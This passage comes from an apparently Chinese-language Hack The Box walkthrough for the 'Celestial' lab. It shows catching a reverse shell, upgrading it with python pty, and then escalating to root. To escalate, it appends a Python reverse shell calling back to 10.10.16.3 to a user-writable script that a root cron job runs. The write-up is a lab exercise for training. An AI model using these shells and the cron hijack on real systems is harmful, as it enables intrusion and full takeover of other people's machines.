wLDc5LDgyLDg0LDQxLDU5LDEwKSApfSgpIn0=</span><br></pre></td></tr></table></figure>
+
+<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220408141824523.png" srcset="/img/loading.gif" lazyload alt="image-20220408141824523"  />
+
+<p>在进行提交时服务端会返回无效的username，但是没关系，可以正常收到反向shell链接：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [10.10.16.3] from (UNKNOWN) [10.10.10.85] 48860</span><br><span class="line">Connected!</span><br><span class="line">uid</span><br><span class="line">/bin/sh: 1: uid: not found</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1000(sun) gid=1000(sun) <span class="built_in">groups</span>=1000(sun),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)</span><br></pre></td></tr></table></figure>
+
+<p>可以检测一下目标有无python环境，一般都是有的：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">which</span> python</span><br><span class="line">/usr/bin/python</span><br></pre></td></tr></table></figure>
+
+<p>那我可以升级一下shell：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>我找到了user.txt:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sun@sun:~$ find / -name user.txt</span><br><span class="line">find / -name user.txt</span><br><span class="line">find: ‘/tmp/systemd-private-6285fa43ec854497a6b87d7c1eab3ed8-colord.service-MBDXg2’: Permission denied</span><br><span class="line">find: ‘/tmp/vmware-root’: Permission denied</span><br><span class="line">find: ‘/tmp/systemd-private-6285fa43ec854497a6b87d7c1eab3ed8-systemd-timesyncd.service-yO3LB8’: Permission denied</span><br><span class="line">find: ‘/tmp/systemd-private-6285fa43ec854497a6b87d7c1eab3ed8-rtkit-daemon.service-Yc1yyh’: Permission denied</span><br><span class="line">find: ‘/home/sun/.gvfs’: Permission denied</span><br><span class="line">find: ‘/home/sun/.cache/dconf’: Permission denied</span><br><span class="line">find: ‘/home/sun/.dbus’: Permission denied</span><br><span class="line">/home/sun/Documents/user.txt</span><br><span class="line">find: ‘/etc/ssl/private’: Permission denied</span><br><span class="line">find: ‘/etc/polkit-1/localauthority’: Permission denied</span><br><span class="line">find: ‘/etc/cups/ssl’: Permission denied</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sun@sun:~/Documents$ <span class="built_in">ls</span> -all</span><br><span class="line"><span class="built_in">ls</span> -all</span><br><span class="line">total 16</span><br><span class="line">drwxr-xr-x  2 sun sun 4096 Mar  4  2018 .</span><br><span class="line">drwxr-xr-x 21 sun sun 4096 Apr  8 00:47 ..</span><br><span class="line">-rw-rw-r--  1 sun sun   29 Sep 21  2017 script.py</span><br><span class="line">-rw-rw-r--  1 sun sun   33 Sep 21  2017 user.txt</span><br></pre></td></tr></table></figure>
+
+<p>在目录中还有一个script.py脚本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sun@sun:~/Documents$ <span class="built_in">cat</span> script.py</span><br><span class="line"><span class="built_in">cat</span> script.py</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Script is running...&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>而在上级目录有一个output.txt中的字符信息与脚本像是存在关联：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sun@sun:~$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">Desktop    Downloads         Music         output.txt  Public     Templates</span><br><span class="line">Documents  examples.desktop  node_modules  Pictures    server.js  Videos</span><br><span class="line">sun@sun:~$ <span class="built_in">cat</span> output.txt</span><br><span class="line"><span class="built_in">cat</span> output.txt</span><br><span class="line">Script is running...</span><br></pre></td></tr></table></figure>
+
+<p>那我可能需要知道这两个文件之中是否真的存在关联，我可以去看一下系统日志：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/log</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> syslog</span><br></pre></td></tr></table></figure>
+
+<p>在日志最底部找到了这样的信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Apr  8 02:35:01 sun CRON[4992]: (root) CMD (python /home/sun/Documents/script.py &gt; /home/sun/output.txt; <span class="built_in">cp</span> /root/script.py /home/sun/Documents/script.py; <span class="built_in">chown</span> sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; <span class="built_in">touch</span> -d <span class="string">&quot;<span class="subst">$(date -R -r /home/sun/Documents/user.txt)</span>&quot;</span> /home/sun/Documents/script.py)</span><br><span class="line">sun@sun:/var/log$ </span><br></pre></td></tr></table></figure>
+
+<p>在日志内还有一堆相关信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Apr  8 01:45:01 sun CRON[4714]: (root) CMD (python /home/sun/Documents/script.py &gt; /home/sun/output.txt; <span class="built_in">cp</span> /root/script.py /home/sun/Documents/script.py; <span class="built_in">chown</span> sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; <span class="built_in">touch</span> -d <span class="string">&quot;<span class="subst">$(date -R -r /home/sun/Documents/user.txt)</span>&quot;</span> /home/sun/Documents/script.py)</span><br><span class="line">Apr  8 01:47:13 sun org.gnome.evolution.dataserver.Sources5[3526]: ** (evolution-source-registry:3807): WARNING **: secret_service_search_sync: must specify at least one attribute to match</span><br><span class="line">Apr  8 01:50:01 sun CRON[4744]: (root) CMD (python /home/sun/Documents/script.py &gt; /home/sun/output.txt; <span class="built_in">cp</span> /root/script.py /home/sun/Documents/script.py; <span class="built_in">chown</span> sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; <span class="built_in">touch</span> -d <span class="string">&quot;<span class="subst">$(date -R -r /home/sun/Documents/user.txt)</span>&quot;</span> /home/sun/Documents/script.py)</span><br><span class="line">Apr  8 01:55:01 sun CRON[4762]: (root) CMD (python /home/sun/Documents/script.py &gt; /home/sun/output.txt; <span class="built_in">cp</span> /root/script.py /home/sun/Documents/script.py; <span class="built_in">chown</span> sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; <span class="built_in">touch</span> -d <span class="string">&quot;<span class="subst">$(date -R -r /home/sun/Documents/user.txt)</span>&quot;</span> /home/sun/Documents/script.py)</span><br><span class="line">Apr  8 02:00:01 sun CRON[4782]: (sun) CMD (nodejs /home/sun/server.js &gt;/dev/null 2&gt;&amp;1)</span><br><span class="line">Apr  8 02:00:01 sun CRON[4783]: (root) CMD (python /home/sun/Documents/script.py &gt; /home/sun/output.txt; <span class="built_in">cp</span> /root/script.py /home/sun/Documents/script.py; <span class="built_in">chown</span> sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; <span class="built_in">touch</span> -d <span class="string">&quot;<span class="subst">$(date -R -r /home/sun/Documents/user.txt)</span>&quot;</span> /home/sun/Documents/script.py)</span><br><span class="line">Apr  8 02:00:36 sun kernel: [ 4419.527491] perf interrupt took too long (5034 &gt; 5000), lowering kernel.perf_event_max_sample_rate to 25000</span><br><span class="line">Apr  8 02:05:01 sun CRON[4806]: (root) CMD (python /home/sun/Documents/script.py &gt; /home/sun/output.txt; <span class="built_in">cp</span> /root/script.py /home/sun/Documents/script.py; <span class="built_in">chown</span> sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; <span class="built_in">touch</span> -d <span class="string">&quot;<span class="subst">$(date -R -r /home/sun/Documents/user.txt)</span>&quot;</span> /home/sun/Documents/script.py)</span><br><span class="line">Apr  8 02:10:01 sun CRON[4825]: (root) CMD (python /home/sun/Documents/script.py &gt; /home/sun/output.txt; <span class="built_in">cp</span> /root/script.py /home/sun/Documents/script.py; <span class="built_in">chown</span> sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; <span class="built_in">touch</span> -d <span class="string">&quot;<span class="subst">$(date -R -r /home/sun/Documents/user.txt)</span>&quot;</span> /home/sun/Documents/script.py)</span><br><span class="line">Apr  8 02:15:01 sun CRON[4843]: (root) CMD (python /home/sun/Documents/script.py &gt; /home/sun/output.txt; <span class="built_in">cp</span> /root/script.py /home/sun/Documents/script.py; <span class="built_in">chown</span> sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; <span class="built_in">touch</span> -d <span class="string">&quot;<span class="subst">$(date -R -r /home/sun/Documents/user.txt)</span>&quot;</span> /home/sun/Documents/script.py)</span><br><span class="line">Apr  8 02:17:01 sun CRON[4855]: (root) CMD (   <span class="built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly)</span><br><span class="line">Apr  8 02:20:01 sun CRON[4865]: (root) CMD (python /home/sun/Documents/script.py &gt; /home/sun/output.txt; <span class="built_in">cp</span> /root/script.py /home/sun/Documents/script.py; <span class="built_in">chown</span> sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; <span class="built_in">touch</span> -d <span class="string">&quot;<span class="subst">$(date -R -r /home/sun/Documents/user.txt)</span>&quot;</span> /home/sun/Documents/script.py)</span><br></pre></td></tr></table></figure>
+
+<p>便于读者阅读，其中关键的信息我筛选了出来：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Apr  8 01:50:01 sun CRON[4744]: (root) CMD (python /home/sun/Documents/script.py &gt; /home/sun/output.txt;</span><br><span class="line">Apr  8 01:55:01 sun CRON[4762]: (root) CMD (python /home/sun/Documents/script.py &gt; /home/sun/output.txt;</span><br><span class="line">Apr  8 02:00:01 sun CRON[4783]: (root) CMD (python /home/sun/Documents/script.py &gt; /home/sun/output.txt;</span><br></pre></td></tr></table></figure>
+
+<p>看起来每过5分钟root用户便会以自身root权限去执行python &#x2F;home&#x2F;sun&#x2F;Documents&#x2F;script.py并将其输出到&#x2F;home&#x2F;sun&#x2F;output.txt，然而script.py是sun用户目录中的，sun对其是拥有完全控制权，也就是说我可以将其更改为我希望执行的python代码，例如用python建立一个反向shell：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.16.3&quot;,1334));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span> &gt;&gt; script.py</span><br></pre></td></tr></table></figure>
+
+<p>等一会儿，便可如愿以偿的收到反向shell：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 1334</span><br><span class="line">listening on [any] 1334 ...</span><br><span class="line">connect to [10.10.16.3] from (UNKNOWN) [10.10.10.85] 37434</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string"># whoami</span></span><br><span class="line"><span class="string">root</span></span><br><span class="line"><span class="string">#cd root</span></span><br><span class="line"><span class="string"># ls</span></span><br><span class="line"><span class="string">root.txt</span></span><br><span class="line"><span class="string">script.py</span></span><br><span class="line"><span class="string"># cat root</span></span><br><span class="line"><span class="string">cat: root: No such file or directory</span></span><br><span class="line"><span class="string"># cat root.txt</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Hack-The-Box/" class="category-chain-item">Hack The Box</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Linux/" class="print-no-link">#Linux</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HTB Walkthrough - Celestial</div>
+      <div>https://crazyinside.github.io/post/HackTheBox-Celestial.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>World'sEnd</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>August 14, 2023</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/post/HackTheBox-Chaos.html" title="HTB Walkthrough - Chaos">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HTB Walkthrough - Chaos</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/post/HackTheBox-Cascade.html" title="HTB Walkthrough Cascade">
+                        <span class="hidden-mobile">HTB Walkthrough Cascade</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
